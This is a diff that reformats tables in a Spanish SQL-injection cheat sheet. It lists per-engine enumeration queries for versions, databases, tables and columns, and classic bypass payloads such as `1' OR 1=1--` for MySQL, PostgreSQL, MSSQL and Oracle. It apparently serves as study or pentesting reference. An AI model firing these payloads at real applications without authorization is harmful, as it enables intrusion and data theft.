@@ -12,16 +12,16 @@ Tags: #Sql #Postgres #mysql #database #inyección #injection #explotación #Expl
 
 ## 🧪 Lenguaje SQL por Motor de Base de Datos (Versión Pro)
 
-|**Función / Acción**|**MySQL**|**PostgreSQL**|**Microsoft SQL Server**|**Oracle DB**|
-|---|---|---|---|---|
-|**Concatenar texto**|`CONCAT('a','b')` o `'a' 'b'`|`'a' \| 'b'`|`'a' + 'b'`|`'a' \| 'b'`|
-|**Subcadena**|`SUBSTRING('abc',1,2)`|`SUBSTRING('abc',1,2)`|`SUBSTRING('abc',1,2)`|`SUBSTR('abc',1,2)`|
-|**Comentarios**|`--` (espacio), `#`|`--` , `/* */`|`--` , `/* */`|`--` , `/* */`|
-|**Versión de BD**|`SELECT @@version`|`SELECT version()`|`SELECT @@version`|`SELECT banner FROM v$version`|
-|**Bases de Datos**|`SELECT schema_name FROM information_schema.schemata`|`SELECT datname FROM pg_database`|`SELECT name FROM master..sysdatabases`|`SELECT username FROM all_users`|
-|**Listar tablas**|`SELECT table_name FROM information_schema.tables`|`SELECT table_name FROM information_schema.tables`|`SELECT table_name FROM information_schema.tables`|`SELECT table_name FROM all_tables`|
-|**Columnas**|`SELECT column_name FROM information_schema.columns WHERE table_name='X'`|`SELECT column_name FROM information_schema.columns WHERE table_name='X'`|`SELECT column_name FROM information_schema.columns WHERE table_name='X'`|`SELECT column_name FROM all_tab_columns WHERE table_name='X'`|
-|**Limitar a 1 fila**|`LIMIT 1`|`LIMIT 1`|`TOP 1`|`WHERE ROWNUM = 1`|
+| **Función / Acción** | **MySQL**                                                                 | **PostgreSQL**                                                            | **Microsoft SQL Server**                                                  | **Oracle DB**                                                  |
+| -------------------- | ------------------------------------------------------------------------- | ------------------------------------------------------------------------- | ------------------------------------------------------------------------- | -------------------------------------------------------------- |
+| **Concatenar texto** | `CONCAT('a','b')` o `'a' 'b'`                                             | `'a' \|\| 'b'`                                                            | `'a' + 'b'`                                                               | `'a' \|\| 'b'`                                                 |
+| **Subcadena**        | `SUBSTRING('abc',1,2)`                                                    | `SUBSTRING('abc',1,2)`                                                    | `SUBSTRING('abc',1,2)`                                                    | `SUBSTR('abc',1,2)`                                            |
+| **Comentarios**      | `--` (espacio), `#`                                                       | `--` , `/* */`                                                            | `--` , `/* */`                                                            | `--` , `/* */`                                                 |
+| **Versión de BD**    | `SELECT @@version`                                                        | `SELECT version()`                                                        | `SELECT @@version`                                                        | `SELECT banner FROM v$version`                                 |
+| **Bases de Datos**   | `SELECT schema_name FROM information_schema.schemata`                     | `SELECT datname FROM pg_database`                                         | `SELECT name FROM master..sysdatabases`                                   | `SELECT username FROM all_users`                               |
+| **Listar tablas**    | `SELECT table_name FROM information_schema.tables`                        | `SELECT table_name FROM information_schema.tables`                        | `SELECT table_name FROM information_schema.tables`                        | `SELECT table_name FROM all_tables`                            |
+| **Columnas**         | `SELECT column_name FROM information_schema.columns WHERE table_name='X'` | `SELECT column_name FROM information_schema.columns WHERE table_name='X'` | `SELECT column_name FROM information_schema.columns WHERE table_name='X'` | `SELECT column_name FROM all_tab_columns WHERE table_name='X'` |
+| **Limitar a 1 fila** | `LIMIT 1`                                                                 | `LIMIT 1`                                                                 | `TOP 1`                                                                   | `WHERE ROWNUM = 1`                                             |
 
 ¡NOTA! ORACLE siempre necesita una tabla especificada: Ej -> ... FROM **DUAL**
 
@@ -74,12 +74,12 @@ Tags: #Sql #Postgres #mysql #database #inyección #injection #explotación #Expl
 
 ### 🧩 Sintaxis por SGBD
 
-|**Motor**|**Ejemplo clásico**|
-|---|---|
-|**MySQL**|`1' OR 1=1--`|
-|**PostgreSQL**|`1' OR '1'='1'--`|
-|**MSSQL**|`1' OR 1=1--`|
-|**Oracle**|`1' OR 'a'='a'--`|
+| **Motor**      | **Ejemplo clásico** |
+| -------------- | ------------------- |
+| **MySQL**      | `1' OR 1=1--`       |
+| **PostgreSQL** | `1' OR '1'='1'--`   |
+| **MSSQL**      | `1' OR 1=1--`       |
+| **Oracle**     | `1' OR 'a'='a'--`   |
 
 ### 🧰 Parámetros útiles
 
